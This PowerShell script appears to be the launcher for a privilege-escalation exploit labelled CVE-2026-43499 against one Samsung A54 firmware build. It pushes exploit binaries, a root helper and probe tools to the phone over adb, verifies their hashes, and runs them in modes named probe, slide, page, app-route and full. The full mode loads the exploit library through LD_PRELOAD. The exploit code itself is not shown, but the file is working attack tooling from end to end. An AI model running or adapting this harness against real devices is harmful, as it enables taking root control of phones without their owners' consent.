param(
    [ValidateSet('probe', 'mcast-probe', 'slide', 'page', 'app-route', 'full')]
    [string]$Mode = 'probe',
    [ValidateSet('mcast', 'sigreturn')]
    [string]$Writer = 'mcast',
    [Parameter(Mandatory)]
    [string]$Serial,
    [string]$Adb = "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe"
)

$ErrorActionPreference = 'Stop'
$repoRoot = Split-Path -Parent $PSScriptRoot
$artifactRoot = Join-Path $repoRoot 'build\a54x-A546EXXSKFZF4'
$payload = Join-Path $artifactRoot 'cve-2026-43499'
$appPayload = Join-Path $artifactRoot 'cve-2026-43499-app.release.so'
$helper = Join-Path $artifactRoot 'cve-2026-43499-root'
$perfProbe = Join-Path $artifactRoot 'test-perf-page-oracle'
$mcastProbe = Join-Path $artifactRoot 'test-native-mcast-overlap'
$writerStamp = Join-Path $artifactRoot ".stack-writer-$Writer"

foreach ($path in @($Adb, $payload, $appPayload, $helper, $perfProbe, $mcastProbe, $writerStamp)) {
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {
        throw "Missing file: $path"
    }
}

$adbArgs = @('-s', $Serial)
& $Adb @adbArgs wait-for-device
$fingerprint = (& $Adb @adbArgs shell getprop ro.build.fingerprint).Trim()
if ($fingerprint -notmatch 'A546EXXSKFZF4') {
    throw "Wrong firmware: $fingerprint"
}

$files = @(
    @($payload, '/data/local/tmp/cve-2026-43499'),
    @($appPayload, '/data/local/tmp/cve-2026-43499-app.so'),
    @($helper, '/data/local/tmp/cve-2026-43499-root'),
    @($perfProbe, '/data/local/tmp/test-perf-page-oracle'),
    @($mcastProbe, '/data/local/tmp/test-native-mcast-overlap')
)
foreach ($pair in $files) {
    & $Adb @adbArgs push $pair[0] $pair[1]
    if ($LASTEXITCODE -ne 0) {
        throw "adb push failed: $($pair[0])"
    }
    $localHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $pair[0]).Hash.ToLowerInvariant()
    $remoteHash = ((& $Adb @adbArgs shell "sha256sum $($pair[1])").Trim() -split '\s+')[0].ToLowerInvariant()
    if ($localHash -ne $remoteHash) {
        throw "Hash mismatch: $($pair[1])"
    }
}
& $Adb @adbArgs shell 'chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root /data/local/tmp/test-perf-page-oracle /data/local/tmp/test-native-mcast-overlap'
if ($LASTEXITCODE -ne 0) {
    throw 'chmod failed'
}

switch ($Mode) {
    'probe' {
        & $Adb @adbArgs shell '/data/local/tmp/test-perf-page-oracle'
    }
    'mcast-probe' {
        & $Adb @adbArgs shell '/data/local/tmp/test-native-mcast-overlap'
    }
    'slide' {
        & $Adb @adbArgs shell 'SLIDE_ONLY=1 EXPLOIT_ATTEMPTS=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true'
    }
    'page' {
        & $Adb @adbArgs shell 'PAGE_ONLY=1 EXPLOIT_ATTEMPTS=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true'
    }
    'app-route' {
        & $Adb @adbArgs shell '/data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/cve-2026-43499-app.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/a54x-app-route.log'
    }
    'full' {
        & $Adb @adbArgs shell 'EXPLOIT_ATTEMPTS=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true'
    }
}
if ($LASTEXITCODE -ne 0) {
    throw "Test failed: mode=$Mode exit=$LASTEXITCODE"
}
